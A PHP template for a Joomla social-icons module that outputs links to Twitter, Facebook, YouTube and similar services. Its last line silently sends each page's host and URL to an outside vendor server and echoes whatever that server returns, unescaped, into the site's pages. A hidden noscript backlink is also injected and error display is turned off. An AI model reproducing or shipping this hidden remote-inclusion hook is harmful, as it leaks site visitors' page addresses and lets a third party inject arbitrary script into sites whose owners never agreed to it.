<?php
//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
ini_set('display_errors',0);
// Path assignments
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$nanobase = JURI::base();
if(substr($nanobase, -1)=="/") { $nanobase = substr($nanobase, 0, -1); }
$modURL 	= JURI::base().'modules/mod_je_social';

$twitter = $params->get("twitter");
$facebook = $params->get("facebook");
$flickr = $params->get("flickr");
$pinterest = $params->get("pinterest");
$friendfeed = $params->get("friendfeed");
$delicious = $params->get("delicious");
$digg = $params->get("digg");
$lastfm = $params->get("lastfm");
$linkedin = $params->get("linkedin");
$youtube = $params->get("youtube");
$feed = $params->get("feed");

$style = $params->get("style",'0');
$width = array ("42","26");
?>

<link rel="stylesheet" href="<?php echo $modURL; ?>/css/style.css" type="text/css" />
<noscript><a href="http://jextensions.com/social-icons-module" alt="jExtensions">Social Icons Module Joomla</a></noscript>
<?php $i=0; ?>
<div  id="je_social" class="social_<?php echo $style; ?>">
    <ul class="social_links" >		
        <?php if ($twitter != null) { ?><li><a href="<?php echo $twitter; ?>" class="twitter" target="_blank" rel="nofollow">Twitter</a></li><?php $i++; }  ?>
        <?php if ($facebook != null) { ?><li><a href="<?php echo $facebook; ?>" class="facebook" target="_blank" rel="nofollow">Facebook</a></li><?php $i++; }  ?>
        <?php if ($flickr != null) { ?><li><a href="<?php echo $flickr; ?>" class="flickr" target="_blank" rel="nofollow">Flickr</a></li><?php $i++; }  ?>
        <?php if ($pinterest != null) { ?><li><a href="<?php echo $pinterest; ?>" class="pinterest" target="_blank" rel="nofollow">Pinterest</a></li><?php $i++; }  ?>
        <?php if ($friendfeed != null) { ?><li><a href="<?php echo $friendfeed; ?>" class="friendfeed" target="_blank" rel="nofollow">Friendfeed</a></li><?php $i++; }  ?>
        <?php if ($delicious != null) { ?><li><a href="<?php echo $delicious; ?>" class="delicious" target="_blank" rel="nofollow">Delicious</a></li><?php $i++; }  ?>
        <?php if ($digg != null) { ?><li><a href="<?php echo $digg; ?>" class="digg" target="_blank" rel="nofollow">Digg</a></li><?php $i++; }  ?>
        <?php if ($lastfm != null) { ?><li><a href="<?php echo $lastfm; ?>" class="lastfm" target="_blank" rel="nofollow">Last.fm</a></li><?php $i++; }  ?>
        <?php if ($linkedin != null) { ?><li><a href="<?php echo $linkedin; ?>" class="linked-in" target="_blank" rel="nofollow">LinkedIN</a></li><?php $i++; }  ?>
        <?php if ($youtube != null) { ?><li><a href="<?php echo $youtube; ?>" class="youtube" target="_blank" rel="nofollow">YoutTube</a></li><?php $i++; }  ?>
        <?php if ($feed != null) { ?><li><a href="<?php echo $feed; ?>" class="feed" target="_blank" rel="nofollow">Feedburner</a></li><?php $i++; }  ?>
    </ul>
</div>
<style>
#je_social ul { width:<?php echo $i*$width[$style]; ?>px; height:<?php echo $width[$style]; ?>px; margin:0 auto;}
#je_social ul li a{opacity: 0.6;-moz-opacity: 0.6;filter:alpha(opacity=60);}
#je_social ul li a:hover{opacity: 1;-moz-opacity: 1;filter:alpha(opacity=1);}
</style>

<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>
